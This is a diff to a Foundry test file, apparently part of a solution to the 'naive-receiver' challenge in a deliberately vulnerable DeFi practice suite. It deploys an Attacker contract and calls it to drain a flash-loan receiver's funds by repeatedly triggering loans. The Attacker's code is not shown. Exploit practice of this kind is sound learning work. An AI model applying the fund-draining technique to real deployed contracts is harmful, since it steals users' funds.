@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
+import {Attacker} from "../../../src/Contracts/naive-receiver/Attacker.sol";
 
 contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -14,6 +15,7 @@ contract NaiveReceiver is Test {
     Utilities internal utils;
     NaiveReceiverLenderPool internal naiveReceiverLenderPool;
     FlashLoanReceiver internal flashLoanReceiver;
+    Attacker internal att;
     address payable internal user;
     address payable internal attacker;
 
@@ -41,6 +43,8 @@ contract NaiveReceiver is Test {
 
         assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);
 
+        att = new Attacker();
+
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
@@ -48,6 +52,9 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+
+        // runs a loop until all funds of the borrower are wasted
+        att.hitFlashLoan(address(naiveReceiverLenderPool), address(flashLoanReceiver));
 
         /**
          * EXPLOIT END *
